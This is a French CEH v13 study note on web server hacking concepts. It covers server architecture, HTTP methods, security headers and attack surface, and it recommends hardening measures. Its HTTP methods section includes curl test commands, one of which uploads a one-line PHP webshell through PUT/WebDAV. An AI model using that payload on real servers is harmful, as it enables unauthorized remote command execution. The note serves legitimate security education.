# 🔴 Module 13 — Concepts Fondamentaux : Hacking Web Servers

> **CEH v13 | EC-Council**  
> `#WebServer` `#HTTP` `#Apache` `#IIS` `#Nginx` `#AttackSurface`

---

## 📌 Table des matières

1. [Architecture d'un serveur web](#1-architecture-serveur-web)
2. [Technologies et logiciels serveurs](#2-technologies-serveurs)
3. [Méthodes HTTP et risques](#3-méthodes-http)
4. [Headers HTTP importants](#4-headers-http)
5. [Surface d'attaque d'un serveur web](#5-surface-dattaque)
6. [Serveur web vs Application web](#6-serveur-vs-application)

---

## 1. Architecture d'un Serveur Web

```
INTERNET
    │
    ▼
[Firewall / CDN / Load Balancer]
    │
    ▼
[Web Server : Apache / IIS / Nginx]
    │          │
    │          ├── Fichiers statiques (HTML, CSS, JS, images)
    │          ├── Scripts dynamiques (PHP, ASP.NET, Python)
    │          └── Configuration (.htaccess, httpd.conf, web.config)
    │
    ▼
[Application Server : PHP-FPM, Tomcat, Node.js, Gunicorn]
    │
    ▼
[Database Server : MySQL, MSSQL, PostgreSQL, MongoDB]
```

---

## 2. Technologies et Logiciels Serveurs

### Principaux serveurs web

| Serveur | Part de marché | Langage config | Fichiers clés |
|---------|---------------|----------------|---------------|
| **Apache** | ~30% | XML/Directives | httpd.conf, .htaccess |
| **Nginx** | ~35% | Block syntax | nginx.conf |
| **IIS (Microsoft)** | ~13% | XML/GUI | web.config, applicationHost.config |
| **Tomcat (Java)** | ~4% | XML | server.xml, web.xml |
| **LiteSpeed** | ~10% | UI/Config | httpd_config.conf |

### Ports standards

```
HTTP  → Port 80  (TCP)
HTTPS → Port 443 (TCP)
HTTP/2 → Port 443 (multiplexé sur TLS)
WebSockets → Port 80/443
FTP → Ports 20/21
FTPS → Port 990
SFTP → Port 22
```

---

## 3. Méthodes HTTP et Risques

```
GET    → Récupérer une ressource (safe, idempotent)
POST   → Envoyer des données au serveur
PUT    → Créer/Remplacer une ressource complète
DELETE → Supprimer une ressource
PATCH  → Modifier partiellement une ressource
HEAD   → Comme GET mais sans le body (test d'existence)
OPTIONS→ Lister les méthodes supportées
TRACE  → Echo de la requête (dangereux : Cross-Site Tracing)
CONNECT→ Établir un tunnel TCP (proxy)
```

### Méthodes dangereuses

```bash
# Vérifier les méthodes activées :
curl -X OPTIONS http://target.com -v

# Réponse dangereuse :
Allow: GET, HEAD, POST, PUT, DELETE, TRACE, OPTIONS, CONNECT
→ PUT/DELETE activés = upload/suppression de fichiers possible !

# Test TRACE (dangereux) :
curl -X TRACE http://target.com
→ Si le serveur retourne la requête → XST (Cross-Site Tracing) possible

# Test WebDAV (PUT) :
curl -X PUT http://target.com/shell.php -d '<?php system($_GET["cmd"]); ?>'
→ Si WebDAV activé → upload de webshell !
```

---

## 4. Headers HTTP Importants

### Headers de sécurité manquants (vulnérabilités)

```
Réponse serveur mal configuré :
HTTP/1.1 200 OK
Server: Apache/2.4.29 (Ubuntu)     ← Version exposée !
X-Powered-By: PHP/7.2.24           ← Technologie exposée !
                                    ← Pas de X-Frame-Options → Clickjacking !
                                    ← Pas de CSP → XSS facilité
                                    ← Pas de HSTS → SSL Stripping possible

Réponse serveur durci :
HTTP/1.1 200 OK
Server: (vide ou "webserver")
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
Referrer-Policy: strict-origin-when-cross-origin
```

---

## 5. Surface d'Attaque

```
┌─────────────────────────────────────────────────────────────────┐
│                SURFACE D'ATTAQUE — SERVEUR WEB                  │
├──────────────────────┬──────────────────────────────────────────┤
│ Configuration        │ Fichiers default, répertoires listés,    │
│                      │ pages d'erreur verbose, méthodes HTTP     │
├──────────────────────┼──────────────────────────────────────────┤
│ Logiciels            │ Version obsolète, patches manquants,      │
│                      │ plugins/modules tiers vulnérables         │
├──────────────────────┼──────────────────────────────────────────┤
│ Authentification     │ Pas d'auth sur /admin, credentiels par   │
│                      │ défaut, basic auth sur HTTP               │
├──────────────────────┼──────────────────────────────────────────┤
│ Fichiers sensibles   │ Backup (.bak, .old), .git, .env, logs    │
├──────────────────────┼──────────────────────────────────────────┤
│ Infrastructure       │ Vieilles versions TLS/SSL, certificats   │
│                      │ expirés, headers révélateurs              │
└──────────────────────┴──────────────────────────────────────────┘
```

---

## 6. Serveur Web vs Application Web

| Aspect | Serveur Web | Application Web |
|--------|-------------|-----------------|
| **Rôle** | Servir les fichiers HTTP | Logique métier |
| **Vulnérabilités** | Misconfiguration, patches | SQLi, XSS, CSRF |
| **Module CEH** | Module 13 | Module 14 |
| **Exemples** | Apache/Nginx vulnérable | WordPress mal configuré |
| **Outils audit** | Nikto, gobuster | Burp Suite, sqlmap |

> ⚠️ **Rappel CEH** : **Module 13** = vulnérabilités du **serveur** (configuration, version, services). **Module 14** = vulnérabilités de l'**application** (code, logique métier, OWASP Top 10).

---

## 🧠 Points clés à retenir pour l'examen

- Apache, Nginx, IIS sont les 3 principaux serveurs web
- Les méthodes **PUT**, **DELETE**, **TRACE** doivent être désactivées
- Le header `Server:` révèle la version → à masquer
- WebDAV activé + PUT = upload de webshell possible
- Surface d'attaque = configuration + logiciel + authentification + fichiers

---

*⬅️ [README](./README.md) | ➡️ [Vecteurs d'attaque](./02_vecteurs_attaque.md)*
